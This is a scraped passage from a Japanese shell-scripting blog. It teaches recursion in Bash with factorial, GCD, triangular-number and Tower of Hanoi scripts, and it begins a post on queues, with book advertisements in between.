5,9-\u0026gt;sort-\u0026gt;一番下(5,6,7,8,9をソート) 0,9-\u0026gt;sort-\u0026gt;一番下(0,1,2,3,4,5,6,7,8,9をソート) 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-12T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-12-01-ani/path_hu71550af48fd719c5bc16d756459bb446_156863_200x0_resize_box_3.png","permalink":"https://suzukiiichiro.github.io/posts/2022-10-12-01-ani/","title":"アルゴリズム日記 2022/10/12"},{"content":"再帰 実行している関数自身の関数の処理内で、自分自身である関数を呼び出し実行することです。\n再帰は必ず基底条件を明示する必要があります。\n（基底条件については以降説明します）\nプログラマの９割は再帰呼び出しを苦手としているそうです。\n裏を返せば、残りの１割がトップコーダーであるわけで、トップコーダーとなる必須条件が「再帰」なのです。\n恐れることはありません。\n代表される再帰の事例を３つ用意しました。\n「再帰」・・。自分で自分を呼び出す。\nそんな馬鹿なこと・・・。\nそりゃそうです。\nでもプログラムではできるんです。\nプログラムソース この章で使っているプログラムソースは以下にあります。\n04_1Factorial.sh 再帰-階乗\n04_2Euclid.sh 再帰-ユークリッドの互除法\n04_3Trianglar.sh.sh 再帰-三角数\n04_4Hanoi.sh 再帰-ハノイの塔\n04_5Hanoi.sh 再帰-ハノイの塔CUI版\n階乗 ３人います。\n３人をA、B、Cとします。\n３人が並ぶ順序の種類を算出する方法は、\n以下の方法で求められます。\n３！＝１＊２＊３＝６通り\n５人の順序の種類は\n５！＝１＊２＊３＊４＊５＝１２０通り\n５の階乗は ５！ と表現します。\n10の階乗を求める場合は？\n１０！＝１＊２＊３＊４＊５＊６＊７＊８＊９＊１０\n＝何通り？\n大変ですよね。\nこうした「階乗（ｆａｃｔｏｒｉａｌ）」を求めるメソッドfactorial()は、関数の中で自分自身であるfactorial()を呼び出すことで簡単に解を求めることができます。\n自分で自分を呼び出すこのような関数呼び出しを「再帰呼び出し」と言います。\n階乗をもとめるBash/シェルスクリプト\n#!/usr/bin/bash ## # \u0026lt;\u0026gt;factorial() # 階乗（再帰） function factorial(){ local param=$1; # 基底条件 if((param==1));then echo \u0026#34;1\u0026#34; ; else # 再帰 echo $(( param * $(factorial $((param-1))) )) ; fi } ## # メイン factorial 10 ; exit ; # 実行結果は以下のとおりです。\nbash-5.1$ bash 04_1Factorial.sh 3628800 bash-5.1$ ユークリッドの互除法（最大公約数） 二つの整数値の最大公約数は、再帰で簡単に求める事が出来ます。\n整数値を長方形の二辺の長さと考えます。\n以下の長方形（８ｘ２２）を、あまりが出ないように「正方形」で埋め尽くしてください。\nそのようにして作られる正方形の辺の長さを求めたいです。\nまずとりあえず８ｘ２２の長方形があります。\n22 +--------------------------------+ | | | | 8| | | | | | +--------------------------------+ この長方形の中にできるだけ大きな正方形を作ればよいわけです。\n高さが８ですので正方形の辺の最大値は８ですね。\nではまずは８ｘ８の正方形を２つ作ることができますね。\n8 8 6 +--------------------------------+ | | | | | | | | 8| | | | | | | | | | | | +--------------------------------+ 右側に高さ８横６のスペースがありますね。\nとなるとさらに６ｘ６の正方形をつくることができますね。\n8 8 6 +--------------------------------+ | | | | | | |6 | 8| | | | | | |--------| | | | | +--------------------------------+ 右下にちょっとしたスペースが残っています。\n８−６＝２ですので、２ｘ２の正方形を３つ作ることができます。\n8 8 6 +--------------------------------+ | | | | | | |6 | 8| | | | | | |--------| | | | 2| 2| 2| +--------------------------------+ 2 2 2 このことから「２２と８の最大公約数」は「２」であることがわかりました。\nそりゃ図で書けば出ますよね。\n実際にやってみてこんなことが言えそうです。\n二つの整数値が与えられたとき、大きいほうの値を小さい方の値で割ってみて、割り切れれば小さい方の値が最大公約数 割り切れない場合は、小さい方の値と得られた余剰に対して、同じ手続きを割り切れるまで再帰的に繰り返す。 いずれが０であれば基底として折り返す。 ソースは以下のとおりです。\n#!/usr/bin/bash # \u0026lt;\u0026gt; gcd() # ユークリッドの互除法（再帰） function gcd(){ local x=$1; local y=$2; # 基底条件 if(($2==0));then echo \u0026#34;$x\u0026#34;; else # 再帰 echo $(gcd $y $(($x % $y)) ); fi } # gcd 22 8 ; # 22x8の四角形 exit ; # 実行結果は以下のとおりです。\nbash-5.1$ bash 04_2Euclid.sh 2 bash-5.1$ 三角数 これは僕が初めて再帰を勉強したときの問題です。\nとても良い問題でせす。興味深く見てください。\nまず、小さな四角の箱がならび三角計が作られています。\n三角形の底辺の数をNとします。\n以下の三角形の底辺は、箱が２つならんでいるのでNは２ですね。\nNが２の時の三角形全体の箱の数の合計は３です。\n□ □□ N:2=3 N（底辺の箱の数）が３の時の三角形全体の箱の数の合計は６です。\n□ □□ □□□ N:3=6 以下のようになりますね。\n□ N:1=1 □ □□ N:2=3 □ □□ □□□ N:3=6 □ □□ □□□ □□□□ N:4=10 □ □□ □□□ □□□□ □□□□□ N:5=15 □ □□ □□□ □□□□ □□□□□ □□□□□□ N:6=21 □ □□ □□□ □□□□ □□□□□ □□□□□□ □□□□□□□ N:7=28 問題）\nN（底辺の箱の数）が６４個ある場合の三角形全体の数は？\nNが７の場合は２８ありました。\nNが６４あると・・・。\nかぞえるのも紙に書くのもちょっとむずかしいですね。\nこういったときに再帰を使います。\nNが７時の三角形全体の箱の数を求めたいと思います。\n「答えは２８」と言わずに、ちょっと聞いてください。\n先に行ってしまうと。\n一つ手前のN6の箱の数に自分のNを足せば答えが出ます。\nN:6=21ですから、２１＋７＝２８です。\n１．まず自分の場所はN:7である。答えはまだわかっていない。\n２．一つ前のN６に答えを聞いてみる。\n３．でもN６もわからないわけです。\n４．N６を求めるためにN５の合計を聞きに行きます。\n５．N５の合計を求めるためにN４に答えを聞きに行きます。\n６．N４を求めるためにN３の合計を聞きに行きます。\n７．N３の合計を求めるためにN２に答えを聞きに行きます。\n８．N３を求めるためにN２の合計を聞きに行きます。\n９．N２の合計を求めるためにN１に答えを聞きに行きます。\nN：１＝１\nこの１を「基底数」と言います。すごく重要です。\n再帰は、「規定数にたどり着いたら、そこで折り返す」というルルールです。\n１０．折返し、N１が１とわかったので、N２に「N１は１」と教える\n１１．N:１＝１とわかったので、１と自分自身のN:2を足し合わせて３であることをN３に伝える。\n１２．N:２＝３とわかったので、３と自分自身のN:3を足し合わせて６であることをN４に伝える。\n１３．N５はN４が１０なので、１０＋５＝１５\n１４．N６はN５が１５なので、１５＋６＝２１\n１５．N７はN６が２１なので、２１＋７＝２８\n：\n：\n＜くりかえし＞\nNが６４までは大変ですが、まあプログラムではわけがありません。\nこうなります。\n#!/usr/bin/bash ## # \u0026lt;\u0026gt;triangle # 三角数（再帰） function triangle(){ local param=$1; # 基底条件 if(($param==1));then echo \u0026#34;1\u0026#34;; else # 再帰 echo $(( param + $(triangle $(($param-1))) )); fi } ## # メイン triangle 64; exit ; 実行結果は以下のとおりです。\nbash-5.1$ bash 04_3Trianglar.sh 2080 bash-5.1$ 恐ろしく簡単ですね。\ntriangle()関数の中で、triangle()関数を呼び出しています。\n$param -1 が肝です。\nひとつ減っているのは、Nが一つ小さな箱の合計数を訪ねに行っているのです。\nあまり深く考えずに、まずはつぎの事例も見てみましょう。\nヒント 計算式一発で解を得る場合（最初に言えと言わないで） N番目の三角数＝(N^2+N)/2\n: N=28の場合 （２８＊２８＋２８）/ ２ ＝２０８０ きゃーー！\n「ハノイの塔」 古代インドの神話では、遠い秘境のお寺で僧侶達が毎日毎晩、６４枚の黄金の円盤をダイヤモンドをちりばめた３つの塔の間で移し替え作業をしているそうです。\nその移し替え作業が完了したら世界の終末が訪れるのだそうです。\n多くの有用なアルゴリズムは再帰的な構造をもっています。\n与えられた問題を、その問題に関連した幾つかの部分問題として解くこのようなアルゴリズムを「分割統治法」と呼びます。(問題は、サイズが小さいほうが簡単に解けることが多いことに注意。)\n再帰による（二分探索）バイナリサーチは、分割統治方式の典型です。\n大きな問題を、２つの小さな問題に分割して、それぞれを別々に解くことで、問題を解決するという考え方です。\nそのそれぞれの小さな問題の解き方がまたむずかしい場合。\nそれもやはり同じで、つまりもっと小さな２つの問題に分割して、そのそれぞれを解けばよいわけです。\nこうした小さな問題に分割する「分割課程」が、基底条件に達するまで続けます。\n基底条件に達したら、問題はそれ以上分割する必要がなくなり、問題は容易に解決できるというアルゴリズムです。\n分割統治法は次の3ステップからなります。\n(分割 Divide) 与えられた大きなサイズの問題を、幾つかの部分問題に分割する。 (統治 Conquer) これらの部分問題のそれぞれを再帰的に解く。 (結合 Combine) 求められた部分問題の解から、元の問題の解を求める。 分割統治方式を実装する再帰メソッドには、通常、自分自身を呼び出す再帰呼び出しが２つあります。\nそれぞれ問題の上半分と下半分に対して自分を呼び出すのです。\nn枚の円盤すべてを移動させるには最低 2^n - 1 回の手数がかかります。\n６４枚の円盤すべてを移動させるには、最低でも（264-1）回 = 18,446,744,073,709,551,615（1844京6744兆737億955万1615）回かかり、１枚移動させるのに1秒かかったとすると、最低でも約5,845億年かかります（なお、ビッグバンは今から約137億年前に発生したとされている）。\nハノイの塔の問題に対する再帰的な分割統治アルゴリズムによって得られる解は、２のｎ乗-1回の移動となります。\nn^2-1\nn=3\n2x2x2-1=7\nwiki pediaに詳しく書いてあります。\nhttps://ja.wikipedia.org/wiki/ハノイの塔\n「ハノイの塔」ルール ・一度に1枚だけ円盤を移動する。\n・小さい円盤の上に大きな円盤を載せてはいけない。\n・棒A、棒B、棒C以外の場所に円盤を置いてはならない。\nハノイの塔 「ハノイの塔」動き方 見ていてもプログラムが浮かびませんね（笑）\nハノイの塔 ここをみてください。とても詳しく書かれています。\nhttp://www13.plala.or.jp/kymats/study/C++/Hanoi/Hanoi.html\n重要なのは、上記サイトの以下の部分です。\nここで重要なのは「3回」の時です。 移動させるべき3枚の円盤の中から 2枚の円盤を棒Aから棒Bに移動させた状態ですね。 同様に「5回」の時は…… 移動させるべき2枚の円盤の中から 1枚の円盤を棒Bから棒Aに移動させた状態ですね。 つまり…… 「移動させる円盤が n 枚ならば、 まずは n-1 枚を棒Aから棒Bに移動しておかなければならない。」 という法則が成り立つのです。 そこに至るまでの過程は無視して下さい。 ３枚の円盤の動きを一枚一枚追っていくのではなく、\n一枚と、２枚（n-1）重なった円盤の組み合わせの動きに着目することです。（上記サイトの３回目にあたります）\nハノイの塔 さらにこのサイトで、考えかたとして重要なことは以下であると書かれています。\nもう一度まとめてみると以下の繰り返しであることがわかります。 １．一番下の円盤を棒Cへ移動させたい。 ２．その為に上に載っている全ての円盤を空いている棒(A or B)に移動させる。 ３．一番下の円盤を棒Cへ移動させる。 http://www13.plala.or.jp/kymats/study/C++/Hanoi/Hanoi.html\n上記サイトの動きをBash/シェルスクリプトで作ると以下の通りとなります。\n#!/usr/bin/bash ########################## # ハノイの塔 # Bash/シェルスクリプト版 ########################## declare -i Moves=0; ## # \u0026lt;\u0026gt;Hanoi() # ハノイの塔の再帰処理部分 function Hanoi() { local n=\u0026#34;$1\u0026#34;; local from=\u0026#34;$2\u0026#34;; local work=\u0026#34;$3\u0026#34;; local dest=\u0026#34;$4\u0026#34;; if((n==1));then echo \u0026#34;move $from-\u0026gt;$dest\u0026#34;; else Hanoi \u0026#34;$((n-1))\u0026#34; $from $dest $work; echo \u0026#34;move $from-\u0026gt;$dest\u0026#34;; Hanoi \u0026#34;$((n-1))\u0026#34; $work $from $dest; fi ((Moves++)); } ## # \u0026lt;\u0026gt;execHanoi() # ハノイの塔の実行呼び出し function execHanoi(){ #第二引数から第四引数へ n 枚の円盤を移動 Hanoi $1 \u0026#34;A\u0026#34; \u0026#34;B\u0026#34; \u0026#34;C\u0026#34;; echo \u0026#34;Total moves = $Moves\u0026#34;; } ## # メイン execHanoi 3 ; exit; # 実行結果は以下のとおりです。\nbash-5.1$ bash 04_4Hanoi.sh move A-\u0026gt;C move A-\u0026gt;B move C-\u0026gt;B move A-\u0026gt;C move B-\u0026gt;A move B-\u0026gt;C move A-\u0026gt;C Total moves = 7 bash-5.1$ ハノイの塔の実稼働が見えるCUI版 #!/usr/bin/bash # 起動方法 ./ファイル名 円盤の数 # ./Hanoni.sh 5 # # グローバル変数 declare -i DISKS=$1; declare -i E_NOPARAM=86; declare -i E_BADPARAM=87; declare -i E_NOEXIT=88; declare -i Moves=0; declare -i MWIDTH=7; declare -i MARGIN=2; declare -a Rod1; # 軸１ declare -a Rod2; # 軸２ declare -a Rod3; # 軸３ # DELAY=0.3 # ディレクをかける # ## # \u0026lt;\u0026gt;repeat() # function repeat(){ for((i=0;i\u0026lt;$2;i++)){ echo -n \u0026#34;$1\u0026#34;; } } ## # \u0026lt;\u0026gt;FromRod() # function FromRod { local rod summit weight sequence while true; do rod=$1; test ${rod/[^123]/} || continue; sequence=$(echo $(seq 0 $disks1 | tail -r )); for summit in $sequence; do eval weight=\\${Rod${rod}[$summit]}; test $weight -ne 0 \u0026amp;\u0026amp; { echo \u0026#34;$rod $summit $weight\u0026#34;; return; } done done } ## # \u0026lt;\u0026gt;ToRod() # function ToRod { local rod firstfree weight sequence while true; do rod=$2; test ${rod/[^123]} || continue; sequence=$(echo $(seq 0 $disks1 | tail -r)); for firstfree in $sequence; do eval weight=\\${Rod${rod}[$firstfree]}; test $weight -gt 0 \u0026amp;\u0026amp; { (( firstfree++ )); break; }; done test $weight -gt $1 -o $firstfree = 0 \u0026amp;\u0026amp; { echo \u0026#34;$rod $firstfree\u0026#34;; return; } done } ## # \u0026lt;\u0026gt;PrintRods() # function PrintRods { local disk rod empty fill sp sequence; tput cup 5 0; repeat \u0026#34; \u0026#34; $spaces1; echo -n \u0026#34;|\u0026#34;; repeat \u0026#34; \u0026#34; $spaces2; echo -n \u0026#34;|\u0026#34;; repeat \u0026#34; \u0026#34; $spaces2; echo \u0026#34;|\u0026#34;; sequence=$(echo $(seq 0 $disks1 | tail -r)); for disk in $sequence;do for rod in {1..3};do eval empty=$(( $DISKS - (Rod${rod}[$disk] / 2) )); eval fill=\\${Rod${rod}[$disk]}; repeat \u0026#34; \u0026#34; $empty; test $fill -gt 0 \u0026amp;\u0026amp; repeat \u0026#34;*\u0026#34; $fill || echo -n \u0026#34;|\u0026#34;; repeat \u0026#34; \u0026#34; $empty; done echo; done repeat \u0026#34;=\u0026#34; $basewidth ; echo } ## # \u0026lt;\u0026gt;display() # function display(){ echo; PrintRods; first=( `FromRod $1` ); eval Rod${first[0]}[${first[1]}]=0; second=( `ToRod ${first[2]} $2` ); eval Rod${second[0]}[${second[1]}]=${first[2]}; if [ \u0026#34;${Rod3[lastmove_t]}\u0026#34; = 1 ];then tput cup 0 0; echo; echo \u0026#34;+ Final Position: $Moves moves\u0026#34;; PrintRods; fi sleep $DELAY; } ## # \u0026lt;\u0026gt;dohanoi() # function dohanoi() { case $1 in 0) ;; *) dohanoi \u0026#34;$(($1-1))\u0026#34; $2 $4 $3 if [ \u0026#34;$Moves\u0026#34; -ne 0 ];then tput cup 0 0; echo; echo \u0026#34;+ Position after move $Moves\u0026#34;; fi ((Moves++)); echo -n \u0026#34; Next move will be: \u0026#34;; echo $2 \u0026#34;--\u0026gt;\u0026#34; $3; display $2 $3; dohanoi \u0026#34;$(($1-1))\u0026#34; $4 $3 $2; ;; esac } ## # setup_arrays() # function setup_arrays(){ local dim n elem; let \u0026#34;dim1 = $1 - 1\u0026#34;; elem=$dim1; for n in $(seq 0 $dim1);do let \u0026#34;Rod1[$elem] = 2 * $n + 1\u0026#34;; Rod2[$n]=0; Rod3[$n]=0; ((elem--)); done } ## # メイン # let \u0026#34;basewidth = $MWIDTH * $DISKS + $MARGIN\u0026#34; let \u0026#34;disks1 = $DISKS - 1\u0026#34; let \u0026#34;spaces1 = $DISKS\u0026#34; let \u0026#34;spaces2 = 2 * $DISKS\u0026#34; let \u0026#34;lastmove_t = $DISKS - 1\u0026#34; trap \u0026#34;tput cnorm\u0026#34; 0 tput civis; clear; # 画面のクリア setup_arrays $DISKS; # 配列の作成 tput cup 0 0; echo; echo \u0026#34;+ Start Position\u0026#34;; case $# in 1) case $(($1\u0026gt;0)) in 1) disks=$1; dohanoi $1 1 3 2; echo; exit 0; ;; *) echo \u0026#34;$0: Illegal value for number of disks\u0026#34;; exit $E_BADPARAM; ;; esac ;; *) echo \u0026#34;実行方法: $0 N\u0026#34;; echo \u0026#34; Where \\\u0026#34;N\\\u0026#34; is the number of disks.\u0026#34;; exit $E_NOPARAM; ;; esac exit $E_NOEXIT; 実行結果 bash-5.1$ bash 04_5Hanoi.sh 3 ソースの内容はともかくこういったものもBash/シェルスクリプトで作成できるって面白いですね。（それでよいです）\nハノイの塔 04_5Hanoi.sh 再帰-ハノイの塔CUI版\n「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-07T11:19:00+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/","title":"【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５"},{"content":"キュー キューはデータ構造の一つです。\nキューは待ち行列とも呼ばれ、その名の通り行列に並ぶ事を考えるとイメージしやすいです。\n行列においては、先に並んだ人ほど優先されます。\nキューにデータを追加する場合、データは一番最後に追加されます。\nキューにデータを追加する操作をenqueue（エンキュー）と呼びます。\nキューからデータを取り出す場合、最も古くに追加されたデータから取り出されます。\nキューからデータを取り出す操作をdequeue（デキュー）と呼びます。\nこのような、先に入れたものを先に出す先入れ先出しの仕組みを\n「First In First Out」を略してFIFOと呼びます。\n以下の図からもわかるとおり、最初に追加した色の箱から取り出されているのがわかると思います。配列の要素の一番古い要素の添字を指し示すのがpeekです。\n配列から要素を取り出すときには、peekを添え字にして取り出すことで、配列全体の中から一番古い要素を取り出すことができます。\nキュー プログラムソース この章で使っているプログラムソースは以下にあります。\n03_1Stack.sh 一般的な配列のキュー\n03_2Eval_Stack.sh 擬似的な２次元配列で実装したキュー\nキューの処理ロジック「リア」と「フロント」 処理は複雑ではありません。むしろシンプルです。\nrear（リア）と、front（フロント）の動きをもう一度見てください。\nリア（最後尾）、フロント（最前面）はどこか。\n追加されるときはリア（最後尾）に。\n出すときはフロント（最前面）から。\nこの図がわかりやすいです。\nキュー Bash/シェルスクリプトの配列で実装したキュー ## # \u0026lt;\u0026gt;queueDisplay() # 表示 function queueDisplay(){ for((i=front;i\u0026lt;rear;i++));do echo \u0026#34;$i\u0026#34; \u0026#34;${queue[i]}\u0026#34;; done echo \u0026#34;------\u0026#34;; } ## # \u0026lt;\u0026gt;dequeue() # デキュー function dequeue(){ ((front++)); } ## # \u0026lt;\u0026gt;enqueue() # エンキュー function enqueue(){ queue[rear++]=$1; } ## # \u0026lt;\u0026gt;peek() # ピーク function peek(){ echo \u0026#34;peek :\u0026#34;$front : ${queue[front]}; } ## # \u0026lt;\u0026gt;execQueue() # キューの実行 function execQueue(){ rear=0; #後ろ端（enqueueされるほう） front=0; #前端（peek/dequeueされるほう) enqueue 10; enqueue 20; enqueue 30; enqueue 40; echo \u0026#34;データを4つenqueue\u0026#34;; peek; queueDisplay; #---- dequeue; dequeue; echo \u0026#34;データを2つdequeue\u0026#34;; peek; queueDisplay; #---- enqueue 50; echo \u0026#34;データを1つenqueue\u0026#34;; peek; queueDisplay; #---- } ## # メイン execQueue; exit; bash/シェルスクリプトによる疑似２次元配列の実装 ####################################### # 03_2Queue.shを、少しだけオブジェクティブに # aRray[0].getValue() で値を取得できるように改変した # 配列にIDと値を入れるだけのbashスクリプト ####################################### ## # グローバル変数 declare -i nElems=0; declare -i rear=0; # ## # \u0026lt;\u0026gt;setValue() # セッター function setValue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getValue() { echo \u0026#34;$value\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setID() # セッター function setID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local ID=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getID() { echo 